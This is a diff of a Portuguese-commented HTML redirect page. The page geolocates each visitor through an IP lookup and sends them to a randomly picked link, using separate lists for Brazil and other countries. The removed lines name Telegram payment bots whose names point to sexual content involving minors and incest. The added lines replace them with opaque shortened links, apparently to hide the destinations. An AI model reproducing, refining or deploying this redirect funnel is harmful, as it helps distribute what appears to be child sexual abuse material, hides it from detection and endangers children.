@@ -33,7 +33,6 @@
       font-size: 1.2rem;
       margin-bottom: 10px;
       color: #444;
-      /* Define uma altura mínima para evitar que o layout pule quando o texto aparecer */
       min-height: 1.5em;
     }
 
@@ -77,45 +76,47 @@
 
   <script>
     const statusText = document.getElementById('status-text');
-    const loadingContainer = document.getElementById('loading-container');
 
+    // --- SEUS NOVOS LINKS ---
+
+    // 2 Links para quem está NO Brasil
+    const linksBrasil = [
+      "https://tinyurl.com/47ernnt7/a39a09d3-9c19-432f-a344-ed3cda8f20ff",
+      "https://tinyurl.com/47ernnt7/c2e5d77b-bd1f-4905-8dca-c58bf67b05d9"
+    ];
+
+    // 2 Links para quem está FORA do Brasil ("gringos")
     const linksInternacionais = [
-      "https://t.me/teenpayments_bot?start=true",
-      "https://t.me/incetspaymentes_bot?start=true",
-      "https://t.me/incesteenpayments_bot?start=true",
-      "https://t.me/incesteenpayments01_bot?start=true",
-      "https://t.me/teenpay02ments_bot?start=true",
-      "https://t.me/teenpay03ments_bot?start=true",
-      "https://t.me/incesteenpayments05_bot?start=true",
-      "https://t.me/incesteenpayments0_bot?start=true"
+      "https://tinyurl.com/47ernnt7/5bac4e02-ebb5-4b46-96d1-1e8d7403fd3d",
+      "https://tinyurl.com/47ernnt7/1eff4e94-a45c-42d2-8e42-9755e319f4eb"
     ];
     
-    const linkBrasil = "https://apextry.com/go/medelos-brasil";
-
     function verificarLocalizacao() {
-      fetch('https://ip-api.com/json/?fields=countryCode')
+      // Adiciona um parâmetro aleatório para evitar o cache do navegador
+      fetch(`https://ip-api.com/json/?fields=countryCode&rand=${new Date().getTime()}`)
         .then(response => response.json())
         .then(data => {
           statusText.textContent = 'Redirecionando...';
 
-          // LÓGICA CORRIGIDA E MAIS SEGURA:
-          // O padrão é ir para o link do Brasil.
-          let destino = linkBrasil;
+          let destino;
 
-          // Somente se a API confirmar que o país NÃO é o Brasil,
-          // o destino muda para um dos links internacionais.
+          // Se a API confirmar que o país NÃO é o Brasil...
           if (data.countryCode && data.countryCode !== 'BR') {
+            // ...sorteia um link da lista internacional.
             destino = linksInternacionais[Math.floor(Math.random() * linksInternacionais.length)];
+          } else {
+            // ...senão (se for BR ou se a API falhar), sorteia um link da lista do Brasil.
+            destino = linksBrasil[Math.floor(Math.random() * linksBrasil.length)];
           }
           
-          // Redireciona para o destino que foi decidido
           location.replace(destino);
         })
         .catch(error => {
-          // Em caso de erro, a nova lógica segura é redirecionar para o link do Brasil
-          console.error('Erro ao verificar a localização, redirecionando para o link padrão:', error);
-          statusText.textContent = 'Não foi possível verificar. Redirecionando...';
-          location.replace(linkBrasil);
+          console.error('Erro na API. Redirecionando para o link padrão do Brasil:', error);
+          statusText.textContent = 'Redirecionando...';
+          // Em caso de erro, por segurança, sorteia um link do Brasil
+          const destinoSeguro = linksBrasil[Math.floor(Math.random() * linksBrasil.length)];
+          location.replace(destinoSeguro);
         });
     }
 
